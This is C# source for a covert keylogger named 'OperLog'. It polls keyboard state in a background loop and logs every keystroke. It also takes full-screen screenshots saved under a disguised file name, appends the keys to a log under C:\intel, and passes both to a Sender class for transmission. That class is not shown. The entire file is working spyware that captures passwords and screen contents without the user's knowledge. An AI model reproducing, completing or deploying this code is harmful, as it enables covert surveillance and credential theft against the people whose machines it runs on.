using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;

namespace OperLog
{
    class Log
    {
        public static int nsymb = 10;
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        //[STAThread]
        BackgroundWorker _bw;
        public void Main() {
            this._bw = new BackgroundWorker();
            this._bw.DoWork += Key_Log;
            this._bw.RunWorkerAsync();
        }
        const string picpath = @"C:\intel\icon.png";
        const string logpath = @"C:\intel\log.log";
        public static void Key_Log(object sender, DoWorkEventArgs e)
        {
            string buf = "";
           while (true) {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++) 
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0) {
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Escape) { buf += "esc"; continue; }
                        if (((Keys)i) == Keys.Back) { buf += "<-"; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        if (((Keys)i).ToString().Length == 1) {
                            buf += ((Keys)i).ToString();
                        }
                        else {
                            buf += $"<{((Keys)i).ToString()}>";
                        }
                        if (buf.Length > nsymb) {
                            // TODO: если скрин не получилось сделать возвращать в лог сообщение о неудаче
                            MakeLog(picpath,logpath,buf);
                            buf = "";
                        }
                    }
                }
           }
        }
        static void Snap(string path) {
            try {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(bmp);
                g.CopyFromScreen(0, 0, Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                bmp.Save(path, ImageFormat.Png);
            }
            catch (Exception) {
                // Application.Restart(); 
            }
        }

       static void AddText(string text, string path)
        {
            File.AppendAllText(logpath, text);
        }

       static void MakeLog(string picpath, string logpath, string text)
       {
           Snap(picpath);
           AddText(text,logpath);
           Sender m = new Sender();
           m.SendLog(text,picpath);
       }
    }
}
